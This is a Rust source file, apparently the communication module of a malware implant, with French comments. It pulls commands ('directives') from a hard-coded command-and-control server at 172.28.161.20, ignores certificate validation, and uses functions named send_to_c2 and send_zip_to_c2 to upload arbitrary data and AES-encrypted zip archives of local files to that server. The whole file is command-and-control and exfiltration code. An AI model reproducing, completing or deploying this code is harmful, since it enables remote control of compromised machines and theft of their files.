use reqwest::Error;
use reqwest::{multipart, Client};
use serde::Deserialize;
use std::fs::File;
use std::io::prelude::*;
use std::io::Read;
use std::path::Path;
use std::path::PathBuf;
use tempfile::NamedTempFile;
use tokio::fs;
use zip::result::ZipResult;
use zip::write::SimpleFileOptions;
use zip::{AesMode, CompressionMethod};

enum _Status {
    SUCCESSFUL,
    FAILED,
}
#[derive(Deserialize)]
struct Directive {
    // id: String,
    command: String,
    // status: String,
}

pub async fn get_directives() -> Result<Vec<String>, Error> {
    let url = "https://172.28.161.20:3030/directives";

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let response = client.get(url).send().await?.error_for_status()?;

    let directives: Vec<Directive> = response.json().await?;

    let commands: Vec<String> = directives
        .into_iter()
        .map(|directive| directive.command)
        .collect();

    Ok(commands)
}

pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Error> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let _res = client
        .post("https://172.28.161.20:3030/directives")
        .body(data)
        .send()
        .await?;

    Ok(())
}

pub async fn zip_file(filename: &PathBuf) -> ZipResult<()> {
    let mut tmp_archive = NamedTempFile::new()?;

    let mut zip = zip::ZipWriter::new(tmp_archive.as_file_mut());

    // Ouvrir le fichier à compresser
    let mut file = File::open(filename)?;
    let mut buff = Vec::new();
    file.read_to_end(&mut buff)?;

    let options = SimpleFileOptions::default()
        .compression_method(CompressionMethod::Zstd)
        .with_aes_encryption(AesMode::Aes256, "password");

    println!("{}", filename.to_string_lossy());

    zip.start_file(filename.to_string_lossy(), options)?;
    zip.write_all(&buff)?;

    zip.finish()?;

    println!("{}", tmp_archive.path().display());

    // DEBUG
    // tmp_archive.persist("archive.zip");

    Ok(())
}

pub async fn send_zip_to_c2(filepath: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let file_name = Path::new(filepath)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("file.zip")
        .to_string();

    let file_bytes = match fs::read(filepath).await {
        Ok(bytes) => bytes,
        Err(e) => {
            eprintln!(
                "Erreur lors de la lecture du fichier '{}': {:?}",
                filepath, e
            );
            return Err(Box::new(e));
        }
    };

    let form = multipart::Form::new().part(
        "file",
        multipart::Part::bytes(file_bytes)
            .file_name(file_name)
            .mime_str("application/zip")?,
    );

    let res = client
        .post("https://172.28.161.20:3030/directives")
        .multipart(form)
        .send()
        .await?;

    println!("Status: {}", res.status());
    Ok(())
}
